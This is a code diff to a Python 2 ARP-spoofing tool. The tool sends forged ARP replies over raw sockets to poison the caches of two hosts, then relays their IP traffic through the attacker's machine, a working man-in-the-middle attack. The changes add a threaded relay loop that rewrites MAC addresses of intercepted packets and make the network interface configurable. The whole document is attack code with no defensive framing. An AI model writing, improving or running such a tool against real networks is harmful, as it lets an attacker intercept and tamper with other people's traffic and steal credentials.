@@ -12,6 +12,7 @@ argv0=sys.argv[0]
 argv1=sys.argv[1]
 argv2=sys.argv[2]
 argv3=sys.argv[3]
+argv4=1
 if argc==5:
 	argv4=sys.argv[4]
 buffer=[]
@@ -20,7 +21,6 @@ arp_reply="\x00\x02"
 arp_request="\x00\x01"
 arp_type=0x0806
 ip_type=0x0800
-
 mymac=format(getmymac(),"012x").decode('hex')
 
 macalen=len(mymac)
@@ -52,7 +52,7 @@ def Mip(x):
     ip.append(x[etherhlen:etherhlen+12])
     ip.append(x[etherhlen+12:etherhlen+16]) #s_ip
     ip.append(x[etherhlen+16:etherhlen+20]) #d_ip
-
+    ip.append(x[etherhlen+20:])
     return ip
 
 def pton(x):
@@ -84,16 +84,15 @@ def get_mac(buffer,ip):
                 print list(requestp)[i].encode('hex'),
             print;print
             for i in range(len(buffer)):
-                index=buffer[i].find(ip)
-                if index!=-1:
+                if buffer[i][etherhlen+14:etherhlen+18]==ip:
                     mac=buffer[i][6:12]
                     return mac
                 else:
                     continue
         time.sleep(0.8)	
 
-def trecv(l,num,etype=arp_type,ch=0):
-	k=threading.Thread(target=ReceivePackets,args=(buffer,etype,l,num))
+def trecv(l,num,etype=arp_type,b=buffer):
+	k=threading.Thread(target=ReceivePackets,args=(b,etype,l,num))
 	k.daemon=True
 	k.start()
 	return k
@@ -110,19 +109,25 @@ def poison(buf,s):
 	time.sleep(float(argv4))
 
 
-def sendrelay(buffer,s):
-    relayp=[Mether(buffer),Mip(buffer)]
-    if relayp[1][2]==sender_ip:
-        relayp[0][1]=target_mac
-    elif relayp[1][2]==target_ip:
-        relayp[0][1]=sender_ip
-    else:
-        return 0
-    srelay="".join(relayp[0]+relayp[1])
-    if s.send(srelay)!=0:
-        return 1
-    else:
-        return 0
+def sendrelay(s,etype=ip_type):
+    ipp = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(etype))  
+    while 1:
+        buffer=[]
+        buffer=ipp.recv(4096)
+        relayp=[Mether(buffer),Mip(buffer)]
+        if relayp[1][1]==sender_ip:
+            relayp[0][0]=target_mac
+            relayp[0][1]=mymac
+        elif relayp[1][2]==sender_ip:
+            relayp[0][0]=sender_mac
+            relayp[0][1]=mymac
+        else:
+            continue
+        srelay="".join(relayp[0]+relayp[1])
+        if s.send(srelay)!=0:
+            print "relay!"
+        else:
+            continue
 
 #def ReadReply():
 
@@ -147,9 +152,9 @@ _packet[1][8]=sender_ip
 requestp="".join(_packet[0]+_packet[1])
 
 s=socket.socket(socket.AF_PACKET,socket.SOCK_RAW,socket.htons(arp_type))
-s.bind(('eth0',0))
+s.bind((argv1,0))
 
-t=trecv(42,10,arp_type)
+t=trecv(2048,10,arp_type)
 
 sender_mac=get_mac(buffer,sender_ip)
 
@@ -193,14 +198,12 @@ __packet[1][8]=target_ip
 
 poisonpT="".join(__packet[0]+__packet[1])
 
-print poisonpS.encode('hex')
-print poisonpT.encode('hex')
 
-t=trecv(2048,2,ip_type)
-
-
+t=threading.Thread(target=sendrelay,args=(s,))
+t.daemon=True
+t.start()
 
 while 1:
     poison(poisonpS,s)
     poison(poisonpT,s)
-    print sendrelay(buffer,s)
+    #sendrelay(s)
